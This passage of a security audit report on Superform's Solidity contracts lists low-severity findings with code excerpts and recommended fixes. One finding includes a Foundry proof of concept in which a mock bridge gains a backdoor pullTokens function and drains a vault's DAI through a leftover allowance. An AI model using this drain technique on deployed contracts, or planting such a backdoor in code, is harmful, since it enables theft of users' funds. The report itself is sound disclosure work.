[112-153](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L112-L153), [156-172](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L156-L172), [207-213](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L207-L213), [216-233](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L216-L233), [236-252](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L236-L252), [270-282](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L270-L282), [285-303](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L285-L303)

```solidity
File: superform-core/src/EmergencyQueue.sol

/// @audit on line 109
108:     function batchExecuteQueuedWithdrawal(uint256[] calldata ids_) external override onlyEmergencyAdmin {
109:             for (uint256 i; i < ids_.length; ++i) {
110:                 _executeQueuedWithdrawal(ids_[i]);
111:             }
112:         }

```

[108-112](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L108-L112)

```solidity
File: superform-core/src/SuperformFactory.sol

/// @audit on line 145
135:     function getAllSuperformsFromVault(address vault_)
136:             external
137:             view
138:             override
139:             returns (uint256[] memory superformIds_, address[] memory superforms_)
140:         {
141:             superformIds_ = vaultToSuperforms[vault_];
142:             uint256 len = superformIds_.length;
143:             superforms_ = new address[](len);
144:     
145:             for (uint256 i; i < len; ++i) {
146:                 (superforms_[i],,) = superformIds_[i].getSuperform();
147:             }
148:         }

/// @audit on line 161
151:     function getAllSuperforms()
152:             external
153:             view
154:             override
155:             returns (uint256[] memory superformIds_, address[] memory superforms_)
156:         {
157:             superformIds_ = superforms;
158:             uint256 len = superformIds_.length;
159:             superforms_ = new address[](len);
160:     
161:             for (uint256 i; i < len; ++i) {
162:                 (superforms_[i],,) = superformIds_[i].getSuperform();
163:             }
164:         }

```

[135-148](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L135-L148), [151-164](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L151-L164)

```solidity
File: superform-core/src/SuperformRouter.sol

/// @audit on line 82
73:     function multiDstSingleVaultDeposit(MultiDstSingleVaultStateReq calldata req_)
74:            external
75:            payable
76:            override(BaseRouter, IBaseRouter)
77:        {
78:            uint64 srcChainId = CHAIN_ID;
79:            uint256 balanceBefore = address(this).balance - msg.value;
80:            uint256 len = req_.dstChainIds.length;
81:    
82:            for (uint256 i; i < len; ++i) {
83:                if (srcChainId == req_.dstChainIds[i]) {
84:                    _singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq(req_.superformsData[i]));
85:                } else {
86:                    _singleXChainSingleVaultDeposit(
87:                        SingleXChainSingleVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
88:                    );
89:                }
90:            }
91:    
92:            _forwardPayment(balanceBefore);
93:        }

/// @audit on line 104
96:     function multiDstMultiVaultDeposit(MultiDstMultiVaultStateReq calldata req_)
97:            external
98:            payable
99:            override(BaseRouter, IBaseRouter)
100:        {
101:            uint64 chainId = CHAIN_ID;
102:            uint256 balanceBefore = address(this).balance - msg.value;
103:            uint256 len = req_.dstChainIds.length;
104:            for (uint256 i; i < len; ++i) {
105:                if (chainId == req_.dstChainIds[i]) {
106:                    _singleDirectMultiVaultDeposit(SingleDirectMultiVaultStateReq(req_.superformsData[i]));
107:                } else {
108:                    _singleXChainMultiVaultDeposit(
109:                        SingleXChainMultiVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
110:                    );
111:                }
112:            }
113:    
114:            _forwardPayment(balanceBefore);
115:        }

/// @audit on line 174
166:     function multiDstSingleVaultWithdraw(MultiDstSingleVaultStateReq calldata req_)
167:             external
168:             payable
169:             override(BaseRouter, IBaseRouter)
170:         {
171:             uint256 balanceBefore = address(this).balance - msg.value;
172:             uint256 len = req_.dstChainIds.length;
173:     
174:             for (uint256 i; i < len; ++i) {
175:                 if (CHAIN_ID == req_.dstChainIds[i]) {
176:                     _singleDirectSingleVaultWithdraw(SingleDirectSingleVaultStateReq(req_.superformsData[i]));
177:                 } else {
178:                     _singleXChainSingleVaultWithdraw(
179:                         SingleXChainSingleVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
180:                     );
181:                 }
182:             }
183:     
184:             _forwardPayment(balanceBefore);
185:         }

/// @audit on line 197
188:     function multiDstMultiVaultWithdraw(MultiDstMultiVaultStateReq calldata req_)
189:             external
190:             payable
191:             override(BaseRouter, IBaseRouter)
192:         {
193:             uint64 chainId = CHAIN_ID;
194:             uint256 balanceBefore = address(this).balance - msg.value;
195:             uint256 len = req_.dstChainIds.length;
196:     
197:             for (uint256 i; i < len; ++i) {
198:                 if (chainId == req_.dstChainIds[i]) {
199:                     _singleDirectMultiVaultWithdraw(SingleDirectMultiVaultStateReq(req_.superformsData[i]));
200:                 } else {
201:                     _singleXChainMultiVaultWithdraw(
202:                         SingleXChainMultiVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
203:                     );
204:                 }
205:             }
206:     
207:             _forwardPayment(balanceBefore);
208:         }

```

[73-93](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L73-L93), [96-115](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L96-L115), [166-185](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L166-L185), [188-208](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformRouter.sol#L188-L208)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit on line 298
279:     function finalizeRescueFailedDeposits(uint256 payloadId_) external override {
280:             /// @dev validates the payload id
281:             _validatePayloadId(payloadId_);
282:     
283:             FailedDeposit storage failedDeposits_ = failedDeposits[payloadId_];
284:     
285:             /// @dev the timelock is elapsed
286:             if (
287:                 failedDeposits_.lastProposedTimestamp == 0
288:                     || block.timestamp < failedDeposits_.lastProposedTimestamp + _getDelay()
289:             ) {
290:                 revert Error.RESCUE_LOCKED();
291:             }
292:     
293:             /// @dev set to zero to prevent re-entrancy
294:             failedDeposits_.lastProposedTimestamp = 0;
295:             IDstSwapper dstSwapper = IDstSwapper(_getAddress(keccak256("DST_SWAPPER")));
296:     
297:             uint256 len = failedDeposits_.amounts.length;
298:             for (uint256 i; i < len; ++i) {
299:                 /// @dev refunds the amount to user specified refund address
300:                 if (failedDeposits_.settleFromDstSwapper[i]) {
301:                     dstSwapper.processFailedTx(
302:                         failedDeposits_.refundAddress, failedDeposits_.settlementToken[i], failedDeposits_.amounts[i]
303:                     );
304:                 } else {
305:                     IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
306:                         failedDeposits_.refundAddress, failedDeposits_.amounts[i]
307:                     );
308:                 }
309:             }
310:     
311:             delete failedDeposits[payloadId_];
312:             emit RescueFinalized(payloadId_);
313:         }

```

[279-313](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L279-L313)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

/// @audit on line 182
161:     function batchProcessTx(
162:             uint256 payloadId_,
163:             uint256[] calldata indices,
164:             uint8[] calldata bridgeIds_,
165:             bytes[] calldata txData_
166:         )
167:             external
168:             override
169:             onlySwapper
170:             nonReentrant
171:         {
172:             IBaseStateRegistry coreStateRegistry = _getCoreStateRegistry();
173:     
174:             _isValidPayloadId(payloadId_, coreStateRegistry);
175:     
176:             (,, uint8 multi,,,) = DataLib.decodeTxInfo(coreStateRegistry.payloadHeader(payloadId_));
177:             if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();
178:     
179:             InitMultiVaultData memory data = abi.decode(coreStateRegistry.payloadBody(payloadId_), (InitMultiVaultData));
180:     
181:             uint256 len = txData_.length;
182:             for (uint256 i; i < len; ++i) {
183:                 _processTx(
184:                     payloadId_, indices[i], bridgeIds_[i], txData_[i], data.liqData[i].interimToken, coreStateRegistry
185:                 );
186:             }
187:         }

/// @audit on line 240
219:     function batchUpdateFailedTx(
220:             uint256 payloadId_,
221:             uint256[] calldata indices_,
222:             address[] calldata interimTokens_,
223:             uint256[] calldata amounts_
224:         )
225:             external
226:             override
227:             onlySwapper
228:         {
229:             uint256 len = indices_.length;
230:     
231:             IBaseStateRegistry coreStateRegistry = _getCoreStateRegistry();
232:     
233:             _isValidPayloadId(payloadId_, coreStateRegistry);
234:     
235:             (,, uint8 multi,,,) = DataLib.decodeTxInfo(coreStateRegistry.payloadHeader(payloadId_));
236:             if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();
237:     
238:             InitMultiVaultData memory data = abi.decode(coreStateRegistry.payloadBody(payloadId_), (InitMultiVaultData));
239:     
240:             for (uint256 i; i < len; ++i) {
241:                 _updateFailedTx(
242:                     payloadId_, indices_[i], interimTokens_[i], data.liqData[i].interimToken, amounts_[i], coreStateRegistry
243:                 );
244:             }
245:         }

```

[161-187](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L161-L187), [219-245](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L219-L245)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit on lines 152, 185
139:     function estimateMultiDstMultiVault(
140:             MultiDstMultiVaultStateReq calldata req_,
141:             bool isDeposit_
142:         )
143:             external
144:             view
145:             override
146:             returns (uint256 liqAmount, uint256 srcAmount, uint256 dstAmount, uint256 totalAmount)
147:         {
148:             uint256 len = req_.dstChainIds.length;
149:             uint256 superformIdsLen;
150:             uint256 totalDstGas;
151:     
152:             for (uint256 i; i < len; ++i) {
153:                 totalDstGas = 0;
154:     
155:                 /// @dev step 1: estimate amb costs
156:                 uint256 ambFees = _estimateAMBFees(
157:                     req_.ambIds[i], req_.dstChainIds[i], _generateMultiVaultMessage(req_.superformsData[i])
158:                 );
159:     
160:                 superformIdsLen = req_.superformsData[i].superformIds.length;
161:     
162:                 srcAmount += ambFees;
163:     
164:                 if (isDeposit_) {
165:                     /// @dev step 2: estimate update cost (only for deposit)
166:                     totalDstGas += _estimateUpdateCost(req_.dstChainIds[i], superformIdsLen);
167:     
168:                     /// @dev step 3: estimation processing cost of acknowledgement
169:                     /// @notice optimistically estimating. (Ideal case scenario: no failed deposits / withdrawals)
170:                     srcAmount += _estimateAckProcessingCost(superformIdsLen);
171:     
172:                     /// @dev step 4: estimate liq amount
173:                     liqAmount += _estimateLiqAmount(req_.superformsData[i].liqRequests);
174:     
175:                     /// @dev step 5: estimate dst swap cost if it exists
176:                     totalDstGas += _estimateSwapFees(req_.dstChainIds[i], req_.superformsData[i].hasDstSwaps);
177:                 }
178:     
179:                 /// @dev step 6: estimate execution costs in dst (withdraw / deposit)
180:                 /// note: execution cost includes acknowledgement messaging cost
181:                 totalDstGas += _estimateDstExecutionCost(isDeposit_, req_.dstChainIds[i], superformIdsLen);
182:     
183:                 /// @dev step 6: estimate if timelock form processing costs are involved
184:                 if (!isDeposit_) {
185:                     for (uint256 j; j < superformIdsLen; ++j) {
186:                         (, uint32 formId,) = req_.superformsData[i].superformIds[j].getSuperform();
187:                         if (formId == TIMELOCK_FORM_ID) {
188:                             totalDstGas += timelockCost[req_.dstChainIds[i]];
189:                         }
190:                     }
191:                 }
192:     
193:                 /// @dev step 7: convert all dst gas estimates to src chain estimate  (withdraw / deposit)
194:                 dstAmount += _convertToNativeFee(req_.dstChainIds[i], totalDstGas);
195:             }
196:     
197:             totalAmount = srcAmount + dstAmount + liqAmount;
198:         }

/// @audit on line 211
201:     function estimateMultiDstSingleVault(
202:             MultiDstSingleVaultStateReq calldata req_,
203:             bool isDeposit_
204:         )
205:             external
206:             view
207:             override
208:             returns (uint256 liqAmount, uint256 srcAmount, uint256 dstAmount, uint256 totalAmount)
209:         {
210:             uint256 len = req_.dstChainIds.length;
211:             for (uint256 i; i < len; ++i) {
212:                 uint256 totalDstGas;
213:     
214:                 /// @dev step 1: estimate amb costs
215:                 uint256 ambFees = _estimateAMBFees(
216:                     req_.ambIds[i], req_.dstChainIds[i], _generateSingleVaultMessage(req_.superformsData[i])
217:                 );
218:     
219:                 srcAmount += ambFees;
220:     
221:                 if (isDeposit_) {
222:                     /// @dev step 2: estimate update cost (only for deposit)
223:                     totalDstGas += _estimateUpdateCost(req_.dstChainIds[i], 1);
224:     
225:                     /// @dev step 3: estimation execution cost of acknowledgement
226:                     srcAmount += _estimateAckProcessingCost(1);
227:     
228:                     /// @dev step 4: estimate the liqAmount
229:                     liqAmount += _estimateLiqAmount(req_.superformsData[i].liqRequest.castLiqRequestToArray());
230:     
231:                     /// @dev step 5: estimate if swap costs are involved
232:                     totalDstGas +=
233:                         _estimateSwapFees(req_.dstChainIds[i], req_.superformsData[i].hasDstSwap.castBoolToArray());
234:                 }
235:     
236:                 /// @dev step 5: estimate execution costs in dst
237:                 /// note: execution cost includes acknowledgement messaging cost
238:                 totalDstGas += _estimateDstExecutionCost(isDeposit_, req_.dstChainIds[i], 1);
239:     
240:                 /// @dev step 6: estimate if timelock form processing costs are involved
241:                 (, uint32 formId,) = req_.superformsData[i].superformId.getSuperform();
242:                 if (!isDeposit_ && formId == TIMELOCK_FORM_ID) {
243:                     totalDstGas += timelockCost[req_.dstChainIds[i]];
244:                 }
245:     
246:                 /// @dev step 7: convert all dst gas estimates to src chain estimate
247:                 dstAmount += _convertToNativeFee(req_.dstChainIds[i], totalDstGas);
248:             }
249:     
250:             totalAmount = srcAmount + dstAmount + liqAmount;
251:         }

/// @audit on line 290
254:     function estimateSingleXChainMultiVault(
255:             SingleXChainMultiVaultStateReq calldata req_,
256:             bool isDeposit_
257:         )
258:             external
259:             view
260:             override
261:             returns (uint256 liqAmount, uint256 srcAmount, uint256 dstAmount, uint256 totalAmount)
262:         {
263:             uint256 totalDstGas;
264:             uint256 superformIdsLen = req_.superformsData.superformIds.length;
265:     
266:             /// @dev step 1: estimate amb costs
267:             uint256 ambFees =
268:                 _estimateAMBFees(req_.ambIds, req_.dstChainId, _generateMultiVaultMessage(req_.superformsData));
269:     
270:             srcAmount += ambFees;
271:     
272:             /// @dev step 2: estimate update cost (only for deposit)
273:             if (isDeposit_) totalDstGas += _estimateUpdateCost(req_.dstChainId, superformIdsLen);
274:     
275:             /// @dev step 3: estimate execution costs in dst
276:             /// note: execution cost includes acknowledgement messaging cost
277:             totalDstGas += _estimateDstExecutionCost(isDeposit_, req_.dstChainId, superformIdsLen);
278:     
279:             /// @dev step 4: estimation execution cost of acknowledgement
280:             if (isDeposit_) srcAmount += _estimateAckProcessingCost(superformIdsLen);
281:     
282:             /// @dev step 5: estimate liq amount
283:             if (isDeposit_) liqAmount += _estimateLiqAmount(req_.superformsData.liqRequests);
284:     
285:             /// @dev step 6: estimate if swap costs are involved
286:             if (isDeposit_) totalDstGas += _estimateSwapFees(req_.dstChainId, req_.superformsData.hasDstSwaps);
287:     
288:             /// @dev step 7: estimate if timelock form processing costs are involved
289:             if (!isDeposit_) {
290:                 for (uint256 i; i < superformIdsLen; ++i) {
291:                     (, uint32 formId,) = req_.superformsData.superformIds[i].getSuperform();
292:     
293:                     if (formId == TIMELOCK_FORM_ID) {
294:                         totalDstGas += timelockCost[CHAIN_ID];
295:                     }
296:                 }
297:             }
298:     
299:             /// @dev step 8: convert all dst gas estimates to src chain estimate
300:             dstAmount += _convertToNativeFee(req_.dstChainId, totalDstGas);
301:     
302:             totalAmount = srcAmount + dstAmount + liqAmount;
303:         }

/// @audit on line 385
375:     function estimateSingleDirectMultiVault(
376:             SingleDirectMultiVaultStateReq calldata req_,
377:             bool isDeposit_
378:         )
379:             external
380:             view
381:             override
382:             returns (uint256 liqAmount, uint256 srcAmount, uint256 totalAmount)
383:         {
384:             uint256 len = req_.superformData.superformIds.length;
385:             for (uint256 i; i < len; ++i) {
386:                 (, uint32 formId,) = req_.superformData.superformIds[i].getSuperform();
387:                 uint256 timelockPrice = timelockCost[uint64(block.chainid)] * _getGasPrice(uint64(block.chainid));
388:                 /// @dev only if timelock form withdrawal is involved
389:                 if (!isDeposit_ && formId == TIMELOCK_FORM_ID) {
390:                     srcAmount += timelockPrice;
391:                 }
392:             }
393:     
394:             if (isDeposit_) liqAmount += _estimateLiqAmount(req_.superformData.liqRequests);
395:     
396:             /// @dev not adding dstAmount to save some GAS
397:             totalAmount = liqAmount + srcAmount;
398:         }

/// @audit on line 415
401:     function estimateAMBFees(
402:             uint8[] memory ambIds_,
403:             uint64 dstChainId_,
404:             bytes memory message_,
405:             bytes[] memory extraData_
406:         )
407:             public
408:             view
409:             returns (uint256 totalFees, uint256[] memory)
410:         {
411:             uint256 len = ambIds_.length;
412:             uint256[] memory fees = new uint256[](len);
413:     
414:             /// @dev just checks the estimate for sending message from src -> dst
415:             for (uint256 i; i < len; ++i) {
416:                 fees[i] = CHAIN_ID != dstChainId_
417:                     ? IAmbImplementation(superRegistry.getAmbAddress(ambIds_[i])).estimateFees(
418:                         dstChainId_, message_, extraData_[i]
419:                     )
420:                     : 0;
421:     
422:                 totalFees += fees[i];
423:             }
424:     
425:             return (totalFees, fees);
426:         }

```

[139-198](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L139-L198), [201-251](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L201-L251), [254-303](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L254-L303), [375-398](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L375-L398), [401-426](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L401-L426)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

/// @audit on line 274
262:     function setBridgeAddresses(
263:             uint8[] memory bridgeId_,
264:             address[] memory bridgeAddress_,
265:             address[] memory bridgeValidator_
266:         )
267:             external
268:             override
269:             onlyProtocolAdmin
270:         {
271:             uint256 len = bridgeId_.length;
272:             if (len != bridgeAddress_.length || len != bridgeValidator_.length) revert Error.ARRAY_LENGTH_MISMATCH();
273:     
274:             for (uint256 i; i < len; ++i) {
275:                 uint8 bridgeId = bridgeId_[i];
276:                 address bridgeAddress = bridgeAddress_[i];
277:                 address bridgeValidatorT = bridgeValidator_[i];
278:                 if (bridgeAddress == address(0)) revert Error.ZERO_ADDRESS();
279:                 if (bridgeValidatorT == address(0)) revert Error.ZERO_ADDRESS();
280:     
281:                 if (bridgeAddresses[bridgeId] != address(0)) revert Error.DISABLED();
282:     
283:                 bridgeAddresses[bridgeId] = bridgeAddress;
284:                 bridgeValidator[bridgeId] = bridgeValidatorT;
285:                 emit SetBridgeAddress(bridgeId, bridgeAddress);
286:                 emit SetBridgeValidator(bridgeId, bridgeValidatorT);
287:             }
288:         }

/// @audit on line 303
291:     function setAmbAddress(
292:             uint8[] memory ambId_,
293:             address[] memory ambAddress_,
294:             bool[] memory isBroadcastAMB_
295:         )
296:             external
297:             override
298:             onlyProtocolAdmin
299:         {
300:             uint256 len = ambId_.length;
301:             if (len != ambAddress_.length || len != isBroadcastAMB_.length) revert Error.ARRAY_LENGTH_MISMATCH();
302:     
303:             for (uint256 i; i < len; ++i) {
304:                 address ambAddress = ambAddress_[i];
305:                 uint8 ambId = ambId_[i];
306:                 bool broadcastAMB = isBroadcastAMB_[i];
307:     
308:                 if (ambAddress == address(0)) revert Error.ZERO_ADDRESS();
309:                 if (ambAddresses[ambId] != address(0) || ambIds[ambAddress] != 0) revert Error.DISABLED();
310:     
311:                 ambAddresses[ambId] = ambAddress;
312:                 ambIds[ambAddress] = ambId;
313:                 isBroadcastAMB[ambId] = broadcastAMB;
314:                 emit SetAmbAddress(ambId, ambAddress, broadcastAMB);
315:             }
316:         }

/// @audit on line 330
319:     function setStateRegistryAddress(
320:             uint8[] memory registryId_,
321:             address[] memory registryAddress_
322:         )
323:             external
324:             override
325:             onlyProtocolAdmin
326:         {
327:             uint256 len = registryId_.length;
328:             if (len != registryAddress_.length) revert Error.ARRAY_LENGTH_MISMATCH();
329:     
330:             for (uint256 i; i < len; ++i) {
331:                 address registryAddress = registryAddress_[i];
332:                 uint8 registryId = registryId_[i];
333:                 if (registryAddress == address(0)) revert Error.ZERO_ADDRESS();
334:                 if (registryAddresses[registryId] != address(0) || stateRegistryIds[registryAddress] != 0) {
335:                     revert Error.DISABLED();
336:                 }
337:     
338:                 registryAddresses[registryId] = registryAddress;
339:                 stateRegistryIds[registryAddress] = registryId;
340:                 emit SetStateRegistryAddress(registryId, registryAddress);
341:             }
342:         }

```

[262-288](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L262-L288), [291-316](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L291-L316), [319-342](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L319-L342)



### Lack of validation in Superform allows a malicious bridge drains any of Superform's assets.

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
NOTE: Bridges are 3rd-party DeFi protocols integrated by Superform, and their role is to token exchange and cross-chain token transfer, thus there is no guarantee that all bridges are TRUSTED.
The core concept of this issue is that if one of them becomes malicious by either intented or non-intended behavior, it can drain all tokens from Superforms which is not a desired action, and this comes from lack of validation in Superform implementation.

- Vulnerability Detail
LiqRequest's txData includes transaction data for token exchange, thus it basically includes these fields: `inputToken`, `inputAmount`, `outputToken`, `outputAmount`.
`inputToken` is a token that bridge contracts pull from Superform to exchange to `outputToken` which is returned to the Superform and is equal to the Superform's underlying asset.

To allow bridges pull tokens from Superform, it increases token allowance for the bridge:
[ERC4626FormImplementation:L211-L217](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L211-L217)
[LiquidityHelper:L49](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L49)

When input tokens are swapped into output tokens, Superform calculates difference in balance to deposit correct amount of tokens to the vault:
[ERC4626FormImplementation:L227](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L227)

Based on the information above, here's steps that a malicious bridge can do to drain tokens from Superforms:
1. Manipulate LiqRequest's txData so that `inputToken` is equal to `outputToken` which is Superform's underlying asset.
2. When the bridge is called to swap `inputToken` to `outputToken`, it does not do anything.
3. Because the `outputToken` is equal to the Superform's underlying asset, Superform calculates the difference between the balance before and the balance now, which is the same amount as deposited amount.
4. A super position is minted with the deposited amount, but allowance from Superform to the bridge is not consumed.
5. The malicious bridge pulls the Superform's tokens.

- Impact
The issue happens when one of bridges becomes malicious, but once that happens, it is very severe because all of Superform's tokens can be drained.

- Proof of Concept
Here's a test case written in Foundry to prove the issue mentioned above:

Made some changes to `LiFiMock` contract to make it malicious:
```Solidity
/// As described above, it does not do anything in swap function
function swapTokensGeneric(
    bytes32, /*_transactionId*/
    string calldata, /*_integrator*/
    string calldata, /*_referrer*/
    address payable _receiver,
    uint256, /*_minAmount*/
    LibSwap.SwapData[] calldata _swapData
)
    external
    payable
{
    // _swap(
    //     _swapData[0].fromAmount,
    //     _swapData[0].sendingAssetId,
    //     _swapData[0].receivingAssetId,
    //     _swapData[0].callData,
    //     _receiver
    // );
}

/// Backdoor function for the bridge to drain tokens from Superform
function pullTokens(address token, address from) public {
    MockERC20(token).transferFrom(from, address(this), MockERC20(token).allowance(from, address(this)));
}
```

```Solidity
function test_MaliciousValidatorDrainTokens() public {
    vm.selectFork(FORKS[ETH]);
    vm.startPrank(deployer);

    uint256 daiAmount = 10 * 1e18; // 10 DAI
    address superform = getContract(
        ETH, string.concat("DAI", "VaultMock", "Superform", Strings.toString(FORM_IMPLEMENTATION_IDS[0]))
    );
    uint256 superformId = DataLib.packSuperform(superform, FORM_IMPLEMENTATION_IDS[0], ETH);
    LiqBridgeTxDataArgs memory liqBridgeTxDataArgs = LiqBridgeTxDataArgs(
        1,
        getContract(ETH, "DAI"),
        getContract(ETH, "DAI"),
        getContract(ETH, "DAI"),
        superform,
        ETH,
        ETH,
        ETH,
        false,
        superform,
        uint256(ETH),
        daiAmount,
        false,
        0,
        1,
        1,
        1
    );

    SingleVaultSFData memory data = SingleVaultSFData(
        superformId,
        daiAmount,
        100,
        LiqRequest(_buildLiqBridgeTxData(liqBridgeTxDataArgs, true), getContract(ETH, "DAI"), address(0), 1, ETH, 0),
        "",
        false,
        false,
        refundAddress,
        ""
    );

    SingleDirectSingleVaultStateReq memory req = SingleDirectSingleVaultStateReq(data);

    address router = getContract(ETH, "SuperformRouter");

    /// Make Superform's initial balance to 10 DAI
    MockERC20(getContract(ETH, "DAI")).transfer(superform, daiAmount);

    /// Single deposit 10 DAI to the Superform
    MockERC20(getContract(ETH, "DAI")).approve(router, daiAmount);
    SuperformRouter(payable(getContract(ETH, "SuperformRouter"))).singleDirectSingleVaultDeposit(req);

    /// Allowance to the bridge remains as 10 DAI
    uint256 allowanceToBridge = MockERC20(getContract(ETH, "DAI")).allowance(superform, getContract(ETH, "LiFiMock"));
    assertEq(allowanceToBridge, daiAmount);

    /// Bridge drains Superform's tokens
    LiFiMock(payable(getContract(ETH, "LiFiMock"))).pullTokens(getContract(ETH, "DAI"), superform);

    // Superform's balance is zero and all tokens are in the bridge
    assertEq(MockERC20(getContract(ETH, "DAI")).balanceOf(superform), 0);
    assertEq(MockERC20(getContract(ETH, "DAI")).balanceOf(getContract(ETH, "LiFiMock")), daiAmount);
}
```

Result of running the test:
```Solidity
Running 1 test for test/unit/superform-forms/superform-form.Audit.t.sol:SuperformAuditTest
[PASS] test_MaliciousValidatorDrainTokens() (gas: 407977)
Test result: ok. 1 passed; 0 failed; finished in 17.78s
```

- Tool used
Manual Review, Foundry

- Recommendation
Two validations can be added to prevent the issue:
1. Check if `inputToken` is same as `outputToken` when LiqRequest's txData is not empty, if same, it should revert.
2. In `_dispatchTokens` function, it should decrease allowance(or make zero) to the bridge contract after swap is done.



### Low Level Calls to Custom Addresses

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Contracts should avoid making low-level calls to custom addresses, especially if these calls are based on address parameters in the function. Such behavior can lead to unexpected execution of untrusted code. Instead, consider using Solidity's high-level function calls or contract interactions.

*Instances (2)*:

```solidity
File: superform-core/src/crosschain-liquidity/LiquidityHandler.sol

54:         (bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_);

```

[54](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L54)

```solidity
File: superform-core/src/payments/PayMaster.sol

112:         (bool success,) = payable(receiver_).call{ value: amount_ }("");

```

[112](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L112)



### Missing limits when setting min/max amounts

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There are some missing limits in these functions, and this could lead to unexpected scenarios. Consider adding a min/max limit for the following values, when appropriate.

*Instances (4)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

427:         allowances[owner][operator][id] = amount;

```

[427](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L427)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

536:         totalTransmuterFees = totalTransmuterFees_;

```

[536](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L536)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

216:         delay = delay_;

346:         requiredQuorum[srcChainId_] = quorum_;

```

[216](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L216), [346](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L346)




### Direct `supportsInterface()` calls may cause caller to revert

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

